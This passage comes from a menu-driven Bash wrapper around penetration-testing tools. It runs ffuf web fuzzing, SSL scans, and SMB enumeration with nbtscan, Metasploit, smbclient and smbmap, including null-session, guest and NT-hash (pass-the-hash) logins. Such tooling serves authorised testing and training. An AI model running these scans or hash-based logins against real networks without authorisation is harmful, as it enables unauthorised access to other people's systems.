                            case $fffuf in

                                1)
                                    while [[  $IP == "" ]]
                                    do 
                                            printf "${WHITE}Insert Target IP:\n${NC}"
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                    done
                                    while [[ $WORDLIST == "" ]]
                                    do
                                        printf "${WHITE}Insert WordList:\n"${NC}
                                        read -e WORDLIST;
                                        printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                    done
                                            printf "${WHITE}Insert a Flag (${YELLOW}Ex: -e (extensions) , -fs (filesize) , -fw (words) , -fc (file code) , -X (POST,GET) , -maxtime-job 60 , -mc all )${WHITE}:\n${NC}"
                                            read -e  FILESIZE;
                                            printf "${WHITE}Flag: ${YELLOW}$FILESIZE${WHITE}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}\n"
            
                                    if [[ $FILESIZE != "" ]]
                                    then
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\nFlag: ${YELLOW}$FILESIZE${WHITE}\n\n" 
                                            printf "${WHITE}Executing command: ${YELLOW}ffuf -c -u ${PURPLE}$IP/FUZZ${YELLOW} -w ${PURPLE}$WORDLIST${YELLOW} ${PURPLE}$FILESIZE${YELLOW}\n\n" 
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            ffuf -c -u $IP/FUZZ -w $WORDLIST $FILESIZE 
                                            unset FILESIZE
                                            unset WORDLIST
                                            printf "\n"
                                    else
                                            clear;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\n" 
                                            printf "${WHITE}Executing command: ${YELLOW}ffuf -c -u ${PURPLE}$IP/FUZZ${YELLOW} -w ${PURPLE}$WORDLIST${YELLOW}\n\n" 
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            ffuf -c -u $IP/FUZZ -w $WORDLIST 
                                            unset FILESIZE
                                            unset WORDLIST
                                            printf "\n" 
                                    fi;;
                                2)
                                    while [[  $IP == "" ]]
                                    do 
                                            printf "${WHITE}Insert Target IP:\n${NC}"
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                    done
                                    while [[ $WORDLIST == "" ]]
                                    do
                                        printf "${WHITE}Insert WordList:\n"${NC}
                                        read -e WORDLIST;
                                        printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                    done
                                            printf "${WHITE}Insert a Flag (${YELLOW}Ex: -e (extensions) , -fs (filesize) -fw (words) , -fc (file code) , -X (POST,GET) , -maxtime-job 60 , -mc all )${WHITE}:\n${NC}"
                                            read -e  FILESIZE;
                                            printf "${WHITE}Flag: ${YELLOW}$FILESIZE${WHITE}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}\n"
            
                                    if [[ $FILESIZE != "" ]]
                                    then
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\nFlag: ${YELLOW}$FILESIZE${WHITE}\n\n" 
                                            printf "${WHITE}Executing command: ${YELLOW}ffuf -c -u ${PURPLE}$IP/FUZZ${YELLOW} -w ${PURPLE}$WORDLIST${YELLOW} ${PURPLE}$FILESIZE${YELLOW} ${PURPLE}-recursion -recursion-depth 2${YELLOW}\n\n" 
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            ffuf -c -u $IP/FUZZ -w $WORDLIST -recursion -recursion-depth 2 $FILESIZE 
                                            unset FILESIZE
                                            unset WORDLIST
                                            printf "\n"
                                    else
                                            clear;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\n" 
                                            printf "${WHITE}Executing command: ${YELLOW}ffuf -c -u ${PURPLE}$IP/FUZZ${YELLOW} -w ${PURPLE}$WORDLIST${YELLOW}  ${PURPLE}-recursion -recursion-depth 2${YELLOW}\n\n" 
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            ffuf -c -u $IP/FUZZ -w $WORDLIST -recursion -recursion-depth 2
                                            unset FILESIZE
                                            unset WORDLIST
                                            printf "\n" 
                                    fi;;


                                3)
                                    while [[ $IP == "" ]]
                                    do  
                                        printf "${WHITE}Insert Target IP:\n${NC}"
                                        read -e IP;
                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                    done
                                    while [[ $WORDLIST == "" ]]
                                    do
                                        printf "${WHITE}Insert WordList:\n"${NC}
                                        read -e WORDLIST;
                                        printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                    done
                                        printf "${WHITE}Insert a Flag (${YELLOW}Ex: -e (extensions) , -fs (filesize) , -fw (words)  , -fc (file code) , -X (POST,GET) , -maxtime-job 60 , -mc all )${WHITE}:\n"${NC}
                                        read -e RESPONSECODE;
                                        printf "${WHITE}Flag: ${YELLOW}$RESPONSECODE${WHITE}\n\n"
                                    while [[ $DOMAINHOST == "" ]]
                                    do
                                        printf "${WHITE}Insert Domain:\n"${NC}
                                        read -e DOMAINHOST;
                                        printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n"
                                    done
            
                                    if [[ $FILESIZE != "" ]]
                                    then
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\nDomain Host: ${YELLOW}$DOMAINHOST${WHITE}\n\nFlag: ${YELLOW}$FILESIZE${WHITE}\n\n" 
                                            printf "${WHITE}Executing command: ${YELLOW}ffuf -c -u ${PURPLE}$IP${YELLOW} -w ${PURPLE}$WORDLIST${YELLOW} -H ${PURPLE}'HOST: FUZZ.$DOMAINHOST'${YELLOW} ${PURPLE}$FILESIZE${YELLOW}\n\n" 
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            ffuf -c -u $IP -w $WORDLIST -H "HOST: FUZZ.$DOMAINHOST" $FILESIZE
                                            unset DOMAINHOST
                                            unset WORDLIST
                                            unset FILESIZE
                                            printf "\n"
                                    else
                                            clear;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\nWordList: ${YELLOW}$WORDLIST${WHITE}\n\n" 
                                            printf "${WHITE}Executing command: ${YELLOW}ffuf -c -u ${PURPLE}$IP${YELLOW} -w ${PURPLE}$WORDLIST${YELLOW} -H ${PURPLE}'HOST: FUZZ.$DOMAINHOST'${YELLOW}\n\n" 
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            ffuf -c -u $IP -w $WORDLIST -H "HOST: FUZZ.$DOMAINHOST"
                                            unset DOMAINHOST
                                            unset WORDLIST
                                            unset FILESIZE
                                            printf "\n" 
                                    fi;;

                                4)
                                    clear;
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n";printf "${WHITE}FileSize: ${YELLOW}$FILESIZE${WHITE}\n\n";printf "${WHITE}Domain Host: ${YELLOW}$DOMAINHOST${WHITE}\n\n";
                                    echo -e "${NC}-------------------------------------------${NC}\n";;

                                5)
                                    clear;

                                    while [[ $IP == "" || $WORDLIST == "" ]]
                                    do  
                                            printf "${WHITE}Insert Target IP:\n${NC}"
                                            read -e  IP;printf "\n"
                                            printf "${WHITE}Insert WordList:\n${NC}"
                                            read -e  WORDLIST;printf "\n"
                                            printf "${WHITE}Insert FileSize:\n${NC}"
                                            read -e  FILESIZE;printf "\n"
                                            printf "${WHITE}Insert Domain Host:\n${NC}"
                                            read -e  DOMAINHOST;printf "\n"
                                            clear;
                                    done
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n";printf "${WHITE}FileSize: ${YELLOW}$FILESIZE${WHITE}\n\n";printf "${WHITE}Domain Host: ${YELLOW}$DOMAINHOST${WHITE}\n\n";
                                            echo -e "${NC}-------------------------------------------${NC}\n";;


                                6)
                                    clear;
                                    printf "Values Cleared!\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n"
                                    unset IP;unset WORDLIST; unset FILESIZE; unset DOMAINHOST;;

                                0)
                                    clear;
                                    break;;

                            esac    
                        done;;


                    7)
                        clear;
                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n";printf "${WHITE}Response Code: ${YELLOW}$RESPONSECODE${WHITE}\n\n";printf "${WHITE}Host Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n";printf "${WHITE}Extension: ${YELLOW}$EXTENSION${WHITE}\n\n"
                        echo -e "${NC}-------------------------------------------${NC}\n";;

                    8)
                        clear;
                            while [[ $IP == "" ]]
                            do  
                            
                                    printf "${WHITE}Insert Target IP (${YELLOW}ex: http://google.com, http://10.10.10.10${WHITE}):\n${NC}"
                                    read -e  IP;printf "\n"
                                    printf "${WHITE}Insert WordList:\n${NC}"
                                    read -e  WORDLIST;printf "\n"
                                    printf "${WHITE}Insert Response Code (${YELLOW}ex: 200,404,403,500${WHITE}):\n${NC}"
                                    read -e  RESPONSECODE;printf "\n"
                                    printf "${WHITE}Insert Host Domain (${YELLOW}ex: google.com, google.local${WHITE}):\n${NC}"
                                    read -e  DOMAINHOST;printf "\n"
                                    printf "${WHITE}Insert Extension (${YELLOW}ex: php,html,txt${WHITE}):\n${NC}"
                                    read -e  EXTENSION;printf "\n"

                                    clear;
                            done
                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}WordList: ${YELLOW}$WORDLIST${WHITE}\n\n";printf "${WHITE}Response Code: ${YELLOW}$RESPONSECODE${WHITE}\n\n";printf "${WHITE}Host Domain: ${YELLOW}$DOMAINHOST${WHITE}\n\n";printf "${WHITE}Extension: ${YELLOW}$EXTENSION${WHITE}\n\n"
                                    echo -e "${NC}-------------------------------------------${NC}\n";;  

                    9)
                        clear;
                        printf "Values Cleared!\n\n"
                        echo -e "${NC}-------------------------------------------${NC}\n"
                        unset IP;unset WORDLIST; unset RESPONSECODE; unset DOMAINHOST;unset EXTENSION;;

                    0)
                        clear;
                        break;;

                esac    

                done;;   

#ssl
            4)
                while : ; do

                    printf "${WHITE}Select A Tool:${NC}\n\n"
                    echo -e "${CYAN}1. SSL Scan ${NC}"
                    echo -e "${CYAN}2. Test SSL ${NC}"
                    echo -e "${GREEN}3. Show Target ${NC}"
                    echo -e "${GREEN}4. Set Target ${NC}"
                    echo -e "${GREEN}5. Clear Target ${NC}"
                    echo -e "${YELLOW}0. Back ${NC}\n"
                    echo -n -e "${RED}Enter selection [0-5]: ${NC}"
                    printf ${WHITE};
                    read -e  -r ssltest;
                    printf "\n";clear;

                case $ssltest in 

                    1) 
                        while [[ $IP == "" ]]
                        do      
                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                read -e  IP;
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                echo -e "${NC}-------------------------------------------${NC}\n"               

                        done
                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                printf "${WHITE}Executing command: ${YELLOW}sslscan ${PURPLE}$IP${YELLOW}\n\n"
                                echo -e "${NC}-------------------------------------------${NC}"
                                sslscan $IP ;printf "\n";;

                    2)
                        while [[ $IP == "" ]]
                        do           
                                printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                read -e  IP;
                                printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                echo -e "${NC}-------------------------------------------${NC}\n" 
                        done            
                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                printf "${WHITE}Executing command: ${YELLOW}testssl.sh ${PURPLE}$IP${YELLOW}\n\n"
                                echo -e "${NC}-------------------------------------------${NC}"
                                sudo testssl $IP ;printf "\n";;

                    3)
                        clear;
                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                        echo -e "${NC}-------------------------------------------${NC}\n";;

                    4)
                        clear; 
                        printf "Insert Target IP:\n"${NC}
                        read -e  IP;printf "\n"
                        clear;
                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                        echo -e "${NC}-------------------------------------------${NC}\n";;

                    5)
                        clear;
                        printf "Target Cleared!\n\n"
                        echo -e "${NC}-------------------------------------------${NC}\n"
                        unset IP;;

                    0)
                        clear;
                        break;;

                esac
                done;;

#active directory

            5)
                while : ; do

                    printf "${WHITE}Select A Protocol:${NC}\n\n"
                    echo -e "${CYAN}1. SMB ${NC}"
                    echo -e "${CYAN}2. LDAP ${NC}"
                    echo -e "${CYAN}3. SMTP ${NC}"
                    echo -e "${CYAN}4. SNMP ${NC}"
                    echo -e "${CYAN}5. NTP ${NC}"
                    echo -e "${CYAN}6. DNS ${NC}"
                    echo -e "${CYAN}7. RDP ${NC}"
                    echo -e "${CYAN}8. RPC ${NC}"
                    echo -e "${CYAN}9. MS-SQL ${NC}"
                    echo -e "${CYAN}10. NetBios ${NC}"                     
                    echo -e "${GREEN}11. Show Target ${NC}"
                    echo -e "${GREEN}12. Set Target ${NC}"
                    echo -e "${GREEN}13. Clear Target ${NC}"
                    echo -e "${YELLOW}0. Back ${NC}\n"
                    echo -n -e "${RED}Enter selection [0-13]: ${NC}"
                    printf ${WHITE};
                    read -e  -r activedirectory;
                    printf "\n";clear;

                case $activedirectory in
#smb
                    1) 
                        while : ; do

                            printf "${WHITE}Select A Tool:${NC}\n\n"
                            echo -e "${CYAN}1. Scan Network ${NC}"
                            echo -e "${CYAN}2. SMB Version ${NC}"
                            echo -e "${CYAN}3. SMB Client ${NC}"
                            echo -e "${CYAN}4. SMB Map  ${NC}"
                            echo -e "${CYAN}5. Nmap ${NC}"
                            echo -e "${CYAN}6. Enum4linux ${NC}"
                            echo -e "${CYAN}7. Crackmapexec ${NC}"
                            echo -e "${CYAN}8. Brute Force ${NC}"
                            echo -e "${CYAN}9. MetaSploit Enum ${NC}"                                                       
                            echo -e "${CYAN}10. Impacket ${NC}"
                            echo -e "${CYAN}11. Show Mount ${NC}"
                            echo -e "${GREEN}12. Show Target ${NC}"
                            echo -e "${GREEN}13. Set Target ${NC}"
                            echo -e "${GREEN}14. Clear Target ${NC}"
                            echo -e "${YELLOW}0. Back ${NC}\n"
                            echo -n -e "${RED}Enter selection [0-14]: ${NC}"
                            printf ${WHITE};
                            read -e  -r smb;
                            printf "\n";clear;

                            case $smb in 

                                1) 

                                    while [[ $IP == "" ]]
                                    do      
                                            printf "${WHITE}";printf "Insert Target IP (${YELLOW}ex: 10.10.10.10 Or 10.10.10.10/24${WHITE}):\n";printf "${NC}";
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}\n"               

                                    done
                                            clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                            printf "${WHITE}Executing command: ${YELLOW}nbtscan ${PURPLE}$IP${YELLOW}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}"
                                            nbtscan $IP ;printf "\n";;                                   

                                2) 

                                    while [[ $IP == "" ]]
                                    do      
                                            printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                            read -e  IP;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}\n"               

                                    done
                                            clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            printf "${WHITE}Executing ${PURPLE}MetaSploit SMB Version ${NC}Enumeration\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}" 
                                            msfconsole -q -x "use auxiliary/scanner/smb/smb_version ; set RHOSTS $IP; set RPORT 139 ; run; exit"&& msfconsole -q -x "use auxiliary/scanner/smb/smb_version ; set RHOSTS $IP ; set RPORT 445 ; run; exit";printf "\n";;  
#smbclient                                
                                3)

                                while : ; do

                                    printf "${WHITE}Select An Option:${NC}\n\n"
                                    echo -e "${CYAN}1. List Shares ${NC}"
                                    echo -e "${CYAN}2. Connect To A Share ${NC}"
                                    echo -e "${CYAN}3. Use SMBv1 (use min protocol NT1) ${NC}"
                                    echo -e "${CYAN}4. Connect Using A Password  ${NC}"
                                    echo -e "${CYAN}5. Connect Using A Password & Domain  ${NC}"
                                    echo -e "${CYAN}6. Connect Using A Hash  ${NC}"
                                    echo -e "${CYAN}7. Connect Using A Hash & Domain ${NC}"
                                    echo -e "${GREEN}8. Show Values ${NC}"
                                    echo -e "${GREEN}9. Set Values ${NC}"
                                    echo -e "${GREEN}10. Clear Values ${NC}"
                                    echo -e "${YELLOW}0. Back ${NC}\n"
                                    echo -n -e "${RED}Enter selection [0-10]: ${NC}"
                                    printf ${WHITE};
                                    read -e  -r smbclientt;
                                    printf "\n";clear;

                                        case $smbclientt in 


                                        1)  
                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}smbclient -N -L ${PURPLE}//$IP${YELLOW}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    smbclient -N -L //$IP; printf "\n";;


                                        2)
                                            while [[ $IP == "" || $SHARE == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Share(${YELLOW}using $ before${WHITE}):\n";printf "${NC}";
                                                    read -e  SHARE;
                                                    printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"; printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    smbclient -U '%' -N \\\\$IP\\$SHARE; printf "\n";;

                                        3)

                                            while [[ $IP == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Share(${YELLOW}using $ before${WHITE}):\n";printf "${NC}";
                                                    read -e  SHARE;
                                                    printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}Executing command: ${YELLOW}smbclient -N ${PURPLE}//$IP/${YELLOW} --option='client min protocol=${PURPLE}NT1${YELLOW}'\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    smbclient -N //$IP/ --option="client min protocol"=NT1; printf "\n";;

                                        4)
                                            while [[ $IP == "" || $SHARE == "" || $USERNAME == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Username:\n";printf "${NC}"
                                                    read -e  USERNAME;
                                                    printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Share(${YELLOW}using $ before${WHITE}):\n";printf "${NC}";
                                                    read -e  SHARE;
                                                    printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    smbclient -U $USERNAME -N \\\\$IP\\$SHARE; printf "\n";;


                                        5)    
                                            while [[ $IP == "" || $SHARE == "" || $USERNAME == "" || $DOMAIN == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Username:\n";printf "${NC}"
                                                    read -e  USERNAME;
                                                    printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Share(${YELLOW}using $ before${WHITE}):\n";printf "${NC}";
                                                    read -e  SHARE;
                                                    printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Domain:\n";printf "${NC}";
                                                    read -e  DOMAIN;
                                                    printf "${WHITE}Domain: ${YELLOW}$DOMAIN${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n";printf "${WHITE}Domain: ${YELLOW}$DOMAIN${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    smbclient "\\\\$IP\\$SHARE" -U $USERNAME -W $DOMAIN -l $IP; printf "\n";;                                                    

                                        6)
                                            while [[ $IP == "" || $USERNAME == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Username:\n";printf "${NC}"
                                                    read -e  USERNAME;
                                                    printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    smbclient -U $USERNAME -L --pw-nt-hash //$IP/; printf "\n";;

                                        7)
                                            while [[ $IP == "" || $SHARE == "" || $USERNAME == "" || $DOMAIN == "" ]]
                                            do      
                                                    printf "${WHITE}";printf "Insert Target IP:\n";printf "${NC}";
                                                    read -e  IP;
                                                    printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Username:\n";printf "${NC}"
                                                    read -e  USERNAME;
                                                    printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Share(${YELLOW}using $ before${WHITE}):\n";printf "${NC}";
                                                    read -e  SHARE;
                                                    printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n"
                                                    printf "${WHITE}";printf "Insert Domain:\n";printf "${NC}";
                                                    read -e  DOMAIN;
                                                    printf "${WHITE}Domain: ${YELLOW}$DOMAIN${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}\n"               

                                            done
                                                    clear;printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n";printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n";printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n";printf "${WHITE}Domain: ${YELLOW}$DOMAIN${WHITE}\n\n"
                                                    echo -e "${NC}-------------------------------------------${NC}"
                                                    smbclient "\\\\$IP\\$SHARE" -U $USERNAME -W $DOMAIN -l $IP --pw-nt-hash; printf "\n";;

                                        8)
                                            clear;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                            printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n"
                                            printf "${WHITE}Domain: ${YELLOW}$DOMAIN${WHITE}\n\n"
                                            printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}\n";;     
        

                                        9)
                                            clear; 
                                            printf "${WHITE}Insert Target IP:\n"${NC}
                                            read -e  IP;printf "\n"
                                            printf "${WHITE}Insert Target Port:\n"${NC}
                                            read -e  PORT;printf "\n"
                                            printf "${WHITE}Insert Share:\n"${NC}
                                            read -e  SHARE;printf "\n"
                                            printf "${WHITE}Insert Target Domain:\n"${NC}
                                            read -e  DOMAIN;printf "\n"
                                            printf "${WHITE}Insert Username:\n"${NC}
                                            read -e  USERNAME;printf "\n"

                                            clear;
                                            printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                            printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                            printf "${WHITE}Share: ${YELLOW}$SHARE${WHITE}\n\n"
                                            printf "${WHITE}Domain: ${YELLOW}$DOMAIN${WHITE}\n\n"
                                            printf "${WHITE}Username: ${YELLOW}$USERNAME${WHITE}\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}\n";;     

                                        10)
                                            clear;
                                            printf "Values Cleared!\n\n"
                                            echo -e "${NC}-------------------------------------------${NC}\n"
                                            unset IP
                                            unset PORT
                                            unset USERNAME
                                            unset SHARE
                                            unset DOMAIN;;        

                                       0)
                                            clear;
                                            break;;                                                    

                                        esac            
                                done;;

#smbmap
                                4)

                                while : ; do

                                    printf "${WHITE}Select An Option:${NC}\n\n"
                                    echo -e "${CYAN}1. Basic ${NC}"
                                    echo -e "${CYAN}2. Null Username ${NC}"
                                    echo -e "${CYAN}3. Guest Username ${NC}"
                                    echo -e "${CYAN}4. Connect Using A Password  ${NC}"
                                    echo -e "${CYAN}5. Recursive List  ${NC}"
                                    echo -e "${GREEN}6. Show Values ${NC}"
                                    echo -e "${GREEN}7. Set Values ${NC}"
                                    echo -e "${GREEN}8. Clear Values ${NC}"
                                    echo -e "${YELLOW}0. Back ${NC}\n"
                                    echo -n -e "${RED}Enter selection [0-8]: ${NC}"
                                    printf ${WHITE};
                                    read -e  -r smbmapp;
                                    printf "\n";clear;

                                        case $smbmapp in 




                                            1) 
                                                while [[ $IP == "" ]]
                                                do      
                                                        printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                        read -e  IP;
                                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 139,445${WHITE}):\n";printf "${NC}";
                                                        read -e  PORT;
                                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}\n"               
            
                                                done
                                                        if [[ $PORT != "" ]]
                                                        then    
                                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                                                printf "${WHITE}Executing command: ${YELLOW}smbmap -H ${PURPLE}$IP${YELLOW} -P ${PURPLE}$PORT${YELLOW}\n\n"
                                                                echo -e "${NC}-------------------------------------------${NC}"
                                                                smbmap -H $IP -P $PORT;printf "\n";
                                                        else
                                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                                printf "${WHITE}Executing command: ${YELLOW}smbmap -H ${PURPLE}$IP${YELLOW} \n\n"
                                                                echo -e "${NC}-------------------------------------------${NC}"
                                                                smbmap -H $IP;printf "\n";
            
                                                       fi;; 

                                            2)
                                                while [[ $IP == "" ]]
                                                do      
                                                        printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                        read -e  IP;
                                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 139,445${WHITE}):\n";printf "${NC}";
                                                        read -e  PORT;
                                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}\n"               
            
                                                done
                                                        if [[ $PORT != "" ]]
                                                        then    
                                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n";printf "${WHITE}Port: ${YELLOW}$PORT\n\n"
                                                                printf "${WHITE}Executing command: ${YELLOW}smbmap -H ${PURPLE}$IP${YELLOW} -u ${PURPLE}null${YELLOW} -p ${PURPLE}null${YELLOW} -P ${PURPLE}$PORT${YELLOW}\n\n"
                                                                echo -e "${NC}-------------------------------------------${NC}"
                                                                sbmap -H $IP -u null -p null -P $PORT;printf "\n";
                                                        else
                                                                clear;printf "${WHITE}Target: ${YELLOW}$IP\n\n"
                                                                printf "${WHITE}Executing command: ${YELLOW}smbmap -H ${PURPLE}$IP${YELLOW} -u ${PURPLE}null${YELLOW} -p ${PURPLE}null${YELLOW}\n\n"
                                                                echo -e "${NC}-------------------------------------------${NC}"
                                                                smbmap -H $IP -u null -p null;printf "\n";
            
                                                       fi;; 

                                            3)
                                                while [[ $IP == "" ]]
                                                do      
                                                        printf "${WHITE}";printf "Insert Target IP Address:\n";printf "${NC}";
                                                        read -e  IP;
                                                        printf "${WHITE}Target: ${YELLOW}$IP${WHITE}\n\n"
                                                        printf "${WHITE}";printf "Insert Port(${YELLOW}ex: 139,445${WHITE}):\n";printf "${NC}";
                                                        read -e  PORT;
                                                        printf "${WHITE}Port: ${YELLOW}$PORT${WHITE}\n\n"
                                                        echo -e "${NC}-------------------------------------------${NC}\n"               
            
                                                done
